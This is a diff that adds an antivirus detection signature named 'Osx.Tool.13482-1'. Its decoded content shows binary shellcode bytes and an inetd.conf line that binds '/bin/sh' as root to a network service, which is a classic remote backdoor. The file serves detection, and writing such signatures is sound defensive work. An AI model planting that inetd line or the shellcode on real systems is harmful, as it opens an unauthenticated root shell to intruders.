@@ -1,0 +1,7 @@
+VIRUS NAME: Osx.Tool.13482-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+|¥*y@‚ÿı}H¦;êp9`p9ÿ|¨)®9ÿe|¨)®8ÿ8‹ş™8 ÿÿ8ş•Dÿÿ````8Ÿÿ8«şÊ8ş”Dÿÿ````8ş–Dÿÿ````|¥*y8ÿVaÿø¡ÿü8ÿø8şËDÿÿ````8ş‘Dÿÿ/etc/inetd.confX
+acmsoda stream tcp nowait root /usr/libexec/tcpd /bin/sh
+/usr/sbin/inetdX
